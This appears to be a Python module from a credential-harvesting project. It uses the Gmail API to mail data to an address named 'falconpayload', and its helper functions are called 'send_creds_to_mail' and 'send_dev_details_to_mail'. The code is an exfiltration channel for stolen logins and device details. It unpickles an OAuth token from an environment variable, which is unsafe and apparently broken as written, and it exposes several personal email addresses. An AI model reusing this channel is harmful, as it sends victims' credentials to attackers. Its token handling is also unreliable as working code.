#Author : hunter.target.001@gmail.com
#File created on 06 Oct 2020 9:39 PM

from googleapiclient.discovery import build
import pickle
from email.mime.text import MIMEText
import base64

import os

def create_message(sender, to, subject, message_text):
    message = MIMEText(message_text)
    message['to'] = to
    message['from'] = sender
    message['subject'] = subject
    #message['cc'] = "rathesun01@gmail.com"
    return {'raw': base64.urlsafe_b64encode(message.as_string().encode()).decode()}

def send_message(service, user_id, message):
    """
    Sends an email message.
    Arguments:
    service: an authorized Gmail API service instance.
    user_id: User's email address. To indicate the authenticated user, the special value "me" can be used.
    message: Message to be sent.
    """
    message = (service.users().messages().send(userId=user_id, body=message)
               .execute())
    print('Message Id: %s' % message['id'])
    return message

def send_data_to_mail(subject, data):

    token_path='mail-token.pickle'

    # mail-token.pickle binary data is set in heroku app against the key "mail-token"
    if os.getenv('mail-token') is not None:
        creds = pickle.loads(os.getenv('mail-token'))
    else:
        with open(token_path, 'rb') as token:
            creds=pickle.load(token)


    service = build('gmail', 'v1', credentials=creds)
    # Call the Gmail API
    user_id = "hunter.target.001@gmail.com"
    results = service.users().labels().list(userId=user_id).execute()
    labels = results.get('labels', [])
    #print("labels: ", labels)
    message = create_message(user_id, "falconpayload@gmail.com", subject, str(data))
    send_message(service, user_id, message)


def send_creds_to_mail(data):
    send_data_to_mail("creds", data)


def send_dev_details_to_mail(data):
    send_data_to_mail("dev details", data)